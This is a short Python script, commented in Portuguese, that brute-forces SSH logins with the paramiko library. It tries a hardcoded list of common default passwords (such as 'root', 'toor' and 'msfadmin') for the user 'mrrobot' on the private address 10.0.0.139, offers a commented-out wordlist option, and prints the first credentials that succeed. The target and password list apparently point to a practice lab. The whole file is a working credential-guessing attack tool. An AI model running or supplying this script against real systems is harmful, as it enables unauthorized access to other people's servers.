# Paramiko é uma Lib para implementação e gerenciamento de acesso SSH
import paramiko
host = "10.0.0.139"
usuario = "mrrobot"
senhas = ["root", "toor", "msfadmin", "test123"]
#senhas = "wordlist.txt"
#Cria um objeto para se conectar ao servidor SSH
conexao = paramiko.SSHClient()
#Cria e adiciona chaves para a conexao SSH
conexao.set_missing_host_key_policy(paramiko.AutoAddPolicy())

# Aqui eu crio uma variavel wordlist que vai abrir o arquivo wordlist.txt
#wordlist = open(senhas, "r")
#for senha in wordlist:

# Um loop para ele testar as senhas dentro do dicionario
for senha in senhas:
    try:
        #conecta-se ao servidor SSH. Caso não seja possivel conectar por usuario e senha invalido ele gera uma exceção
        conexao.connect(host, username=usuario, password=senha, timeout=1)
    #qualquer erro é de bom agrado!
    except:
        pass
    else:
        print("User:", usuario)
        print("Pass:", senha)
        break
    finally:
        conexao.close()
